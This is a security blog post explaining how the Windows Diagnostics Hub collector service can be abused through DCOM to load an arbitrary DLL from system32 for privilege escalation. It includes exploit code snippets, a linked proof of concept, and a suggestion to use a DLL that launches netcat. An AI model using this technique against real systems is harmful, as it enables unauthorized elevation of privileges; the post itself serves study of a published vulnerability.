---
categories:
- Vulnerability
layout: post
media_subpath: /assets/posts/2019-03-06-abusing-diaghub
tags:
- arbitrary file write
- diaghub
- windows
title: Abusing Diaghub
---

This post is based on this [article](https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html?m=1) from google project zero. For more details please read their awesome post, I will just give a brief overview.

Microsoft (R) Diagnostics Hub Standard Collector Service (diaghub) is a service that gives diagnostic information by collecting trace information. Its functionality is exposed over a DCOM object. We can talk to this DCOM object and force it to load an arbitrary dll. As diaghub can only load dlls from system32 it is assumed that you have some way to write to system32 (in the referenced blogpost they show a vulnerability utilizing hardlinks to achieve that). I uploaded the exploit [here](https://github.com/xct/diaghub). This is a minimal version of the original poc from project zero. If you want to learn how it works continue reading, otherwise just grab and run it.

DCOM (Distributed COM) is a form of RPC which allows client objects to talk to server objects and request services from them (similar to CORBA). This allows programs written in different programming languages or running on different platforms to interface with each other.

In the following part I will give an overview about the most important steps involved. First we create a GUID with `CoCreateGuid(&name)` [(CoCreateGuid)](https://docs.microsoft.com/en-us/windows/desktop/api/combaseapi/nf-combaseapi-cocreateguid), a unique 128-bit integer that is used for CLSIDs. These CLSIDs identify COM class objects. Then we call `CoCreateInstance(CLSID_CollectorService, nullptr, CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&service))`, [(CoCreateInstance)](https://docs.microsoft.com/en-us/windows/desktop/api/combaseapi/nf-combaseapi-cocreateinstance) which creates a new, uninitialized object from the COM class. The class is specified by its CLSID value, in this case `CLSID_CollectorService`.

The next call is `CoQueryProxyBlanket(service, &authn_svc, &authz_svc, &principal_name, &authn_level, &imp_level, &identity, &capabilities)`, [(CoQueryProxyBlanket)](https://docs.microsoft.com/en-us/windows/desktop/api/combaseapi/nf-combaseapi-coqueryproxyblanket) which retrieves authentication information that the client will use to talk to the proxy. These are then used to authenticate to the proxy with `CoSetProxyBlanket(service, authn_svc, authz_svc, principal_name, authn_level, RPC_C_IMP_LEVEL_IMPERSONATE, identity, capabilities)` [(CoSetProxyBlanket)](https://docs.microsoft.com/en-us/windows/desktop/api/combaseapi/nf-combaseapi-cosetproxyblanket).

We then configure and create a new session on the proxy:

```
SessionConfiguration config = {};
config.version = 1;
config.monitor_pid = ::GetCurrentProcessId();
CoCreateGuid(&config.guid);
bstr_t path = valid_dir;
config.path = path;
ICollectionSessionPtr session;

ThrowOnError(service->CreateSession(&config, nullptr, &session));
```

Finally we create an agent and add the agent to the session. This triggers the load of the given DLL.

```
GUID agent_guid;
CoCreateGuid(&agent_guid);
ThrowOnError(session->AddAgent(targetDll, agent_guid));
```

You can use any DLL for this, a minimal one that just starts nc would look like [this](https://gist.github.com/xct/3949f3f4f178b1f3427fae7686a2a9c0).

To use the exploit, change the strings for valid\_dir and target\_dll (must be a file in system32, extension does not matter), compile it for the correct target architecture and run `diaghub.exe`.